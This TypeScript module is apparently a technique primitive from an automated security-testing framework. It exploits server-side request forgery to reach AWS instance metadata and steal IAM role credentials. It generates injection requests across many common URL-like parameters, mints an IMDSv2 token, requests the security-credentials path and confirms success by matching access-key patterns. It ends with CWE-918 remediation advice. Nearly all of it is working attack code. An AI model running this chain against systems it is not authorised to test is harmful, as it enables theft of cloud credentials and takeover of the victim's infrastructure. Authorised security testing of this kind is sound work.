/**
 * ssrfMetadata — SSRF pivoting to cloud instance metadata (AWS IMDSv2) to exfil
 * IAM credentials.
 *
 * Many SSRF-flavored parameters (url, target, file, image, webhook, redirect,
 * callback, etc.) reach an internal fetcher. On AWS this fetcher can be coerced
 * into hitting the link-local instance metadata service at 169.254.169.254,
 * stealing the host's IAM role credentials. IMDSv2 requires a session token,
 * so the primitive chains three steps:
 *   1. ssrf-basic          — confirm the SSRF sink reaches the metadata IP.
 *   2. ssrf-imdsv2-token   — PUT to /latest/api/token to mint an IMDSv2 token.
 *   3. ssrf-imdsv2-creds   — GET IAM security-credentials WITH the token header.
 *
 * The oracle only CONFIRMS when a 200 response carries a cloud-metadata
 * signature (169.254.169.254, security-credentials, InstanceProfile, ami-id,
 * imds, or an AKIA access-key id) AND the claim is backed by a recorded
 * evidence item (EvidenceGate). Severity is critical when IAM credential
 * material appears, else high.
 */

import type {
  TechniquePrimitive,
  TechniqueContext,
  AttackStep,
  StepExecutionResult,
  PrimitiveResult,
} from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'

const METADATA_IP = '169.254.169.254'
const SSRF_PARAMS = ['url', 'target', 'host', 'file', 'path', 'image', 'img', 'avatar', 'logo', 'redirect', 'webhook', 'callback', 'proxy', 'src', 'link', 'site', 'page', 'resource', 'endpoint']

/** Cloud-metadata signatures that prove the SSRF sink reached IMDS. */
const METADATA_SIGNATURES = [
  '169.254.169.254',
  'security-credentials',
  'instanceprofile',
  'ami-id',
  'imds',
]

/** IAM credential material — elevates severity to critical. */
const CRED_SIGNATURES = ['security-credentials', 'instanceprofile', 'AKIA']

function hasSignature(body: string): boolean {
  if (!body) return false
  const lower = body.toLowerCase()
  return METADATA_SIGNATURES.some((s) => lower.includes(s)) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
}

function hasCredSignature(body: string): boolean {
  if (!body) return false
  const lower = body.toLowerCase()
  return CRED_SIGNATURES.some((s) => lower.includes(s)) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
}

/** Build the injectable URL: <base>?param=<payload> (or body JSON for non-GET). */
function injectParam(base: string, param: string, payload: string, method: string): { url: string; body?: string } {
  if (method !== 'GET') {
    return { url: base, body: JSON.stringify({ [param]: payload }) }
  }
  try {
    const u = new URL(base)
    u.searchParams.set(param, payload)
    return { url: u.toString() }
  } catch {
    return { url: `${base}${base.includes('?') ? '&' : '?'}${encodeURIComponent(param)}=${encodeURIComponent(payload)}` }
  }
}

export const ssrfMetadata: TechniquePrimitive = {
  id: 'ssrfMetadata',
  name: 'SSRF to Cloud Metadata Exfil',
  description:
    'Server-Side Request Forgery pivoting to the cloud instance metadata service (AWS IMDSv2) to steal IAM role credentials.',
  technique: 'ssrf',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    // Treat any endpoint/target as applicable; if a payload/param is supplied it
    // is the injectable sink, otherwise we default to a `url` query parameter.
    return true
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const base = ctx.endpoint?.url ?? ctx.target!
    const param = (ctx.payloads && ctx.payloads.length > 0 ? ctx.payloads[0] : undefined) ?? ctx.param ?? 'url'
    const method = (ctx.endpoint?.method && ctx.endpoint.method !== 'GET' ? ctx.endpoint.method : 'GET').toUpperCase()
    const headers = { ...(ctx.sessionHeaders ?? {}) }

    const steps: AttackStep[] = []

    // 1. Basic reachability: confirm the sink can hit the metadata IP.
    const basic = injectParam(base, param, `http://${METADATA_IP}/`, method)
    steps.push({
      id: 'ssrf-basic',
      description: `Inject cloud metadata URL into "${param}" → http://${METADATA_IP}/`,
      request: { method, url: basic.url, headers, ...(basic.body ? { body: basic.body } : {}) },
      expectedSignal: `response reflects ${METADATA_IP} / IMDS content`,
      metadata: { kind: 'ssrf-metadata', param, payload: `http://${METADATA_IP}/` },
    })

    const meta = injectParam(base, param, `http://${METADATA_IP}/latest/meta-data/`, method)
    steps.push({
      id: 'ssrf-basic-meta',
      description: `Inject metadata path into "${param}" → http://${METADATA_IP}/latest/meta-data/`,
      request: { method, url: meta.url, headers, ...(meta.body ? { body: meta.body } : {}) },
      expectedSignal: `response reflects /latest/meta-data/ content`,
      metadata: { kind: 'ssrf-metadata', param, payload: `http://${METADATA_IP}/latest/meta-data/` },
    })

    // 2. IMDSv2 token: PUT a ttl header to mint a session token.
    const tokenUrl = injectParam(base, param, `http://${METADATA_IP}/latest/api/token`, method)
    steps.push({
      id: 'ssrf-imdsv2-token',
      description: `PUT IMDSv2 token endpoint into "${param}" → /latest/api/token`,
      request: {
        method: method === 'GET' ? 'PUT' : method,
        url: tokenUrl.url,
        headers: { ...headers, 'X-aws-ec2-metadata-token-ttl-seconds': '21600' },
        ...(tokenUrl.body ? { body: tokenUrl.body } : {}),
      },
      expectedSignal: `IMDSv2 token returned in body`,
      metadata: { kind: 'ssrf-imdsv2-token', param, payload: `http://${METADATA_IP}/latest/api/token` },
    })

    // 3. IMDSv2 creds: GET IAM security-credentials with the token header.
    const credsUrl = injectParam(base, param, `http://${METADATA_IP}/latest/meta-data/iam/security-credentials/`, method)
    steps.push({
      id: 'ssrf-imdsv2-creds',
      description: `GET IAM security-credentials into "${param}" with IMDSv2 token header`,
      request: {
        method,
        url: credsUrl.url,
        headers: { ...headers, 'X-aws-ec2-metadata-token': 'AQAAA...IMDSv2-TOKEN-PLACEHOLDER' },
        ...(credsUrl.body ? { body: credsUrl.body } : {}),
      },
      expectedSignal: `IAM role + access key material returned`,
      metadata: { kind: 'ssrf-imdsv2-creds', param, payload: `http://${METADATA_IP}/latest/meta-data/iam/security-credentials/` },
    })

    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    // Find a 200 response carrying a metadata signature; prefer credential material.
    let repStep: StepExecutionResult | undefined
    let credsExposed = false

    for (const r of results) {
      const ok200 = (r.status ?? 0) >= 200 && (r.status ?? 0) < 300
      if (!ok200) continue
      const body = r.body ?? ''
      if (hasSignature(body)) {
        const hasCreds = hasCredSignature(body)
        // Prefer the credential-bearing response as the representative claim.
        if (!repStep || hasCreds) {
          repStep = r
          if (hasCreds) credsExposed = true
        }
        if (hasCreds && !repStep) credsExposed = true
      }
    }

    if (!repStep) {
      return {
        confirmed: false,
        confidence: 0,
        evidence: [],
        note: 'no 200 response carried a cloud-metadata signature',
      }
    }

    const rep = repStep as StepExecutionResult
    const repUrl = rep.step.request.url
    const repStatus = rep.status!
    const repMethod = rep.step.request.method

    // Evidence-backed confirmation: the claim must co-occur with a recorded
    // evidence item (runPrimitive records each step's observed facts).
    const { verified } = evidenceGate.verifyClaim(claimFor('ssrf-metadata', repUrl, repStatus, repMethod))

    const confirmed = verified
    const severity = confirmed ? (credsExposed ? 'critical' : 'high') : undefined

    const evidence = results
      .filter((r) => (r.status ?? 0) >= 200 && (r.status ?? 0) < 300)
      .map((r) => ({
        kind: 'response' as const,
        label: `${r.step.request.method} ${r.step.request.url} → ${r.status}`,
        data: (r.body ?? '').slice(0, 1500),
        ref: r.step.id,
      }))

    return {
      confirmed,
      confidence: confirmed ? (credsExposed ? 0.95 : 0.85) : 0.1,
      evidence,
      severity,
      finding: confirmed
        ? {
            category: 'ssrf',
            description: `SSRF to AWS IMDS${credsExposed ? ' exfiltrated IAM credentials' : ' confirmed'} via parameter "${rep.step.metadata?.param ?? 'url'}" on ${repUrl}.${credsExposed ? ' IAM role/access-key material reachable from the web app.' : ''}`,
            request: rep.step.request,
            response: { status: repStatus, body: (rep.body ?? '').slice(0, 1000) },
            cwe: 'CWE-918',
            remediation:
              'Allowlist outbound destinations; block link-local (169.254.0.0/16) and IMDS. Enforce IMDSv2 hop-limit=1 and require a signed token. Validate user-supplied URLs against an allowlist.',
          }
        : undefined,
      note: `credsExposed=${credsExposed} verified=${verified}`,
    }
  },
}

// referenced for parity with other SSRF primitives (kept for clarity)
void SSRF_PARAMS
